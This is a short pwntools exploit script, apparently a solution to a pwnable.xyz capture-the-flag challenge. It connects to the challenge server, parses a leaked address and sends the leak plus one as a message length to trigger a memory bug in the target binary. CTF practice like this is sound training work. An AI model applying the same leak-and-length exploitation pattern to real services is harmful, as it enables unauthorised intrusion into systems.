from pwn import *

context.log_level = "debug"

elf = context.binary = ELF("./challenge")
# io = process(elf.path)

io = remote("svc.pwnable.xyz", 30000)

io.recvline()  # Welcome
leak = io.recvline().split()[1]  # Leak: 0xXXX
print(leak)

leak = int(leak, 16)
leak_plus_one = leak + 1

io.recvuntil(b"message:")  # Length of message
io.sendline(str(leak_plus_one))
io.recvuntil(b"message:")  # Enter message
io.sendline()
io.recvall()
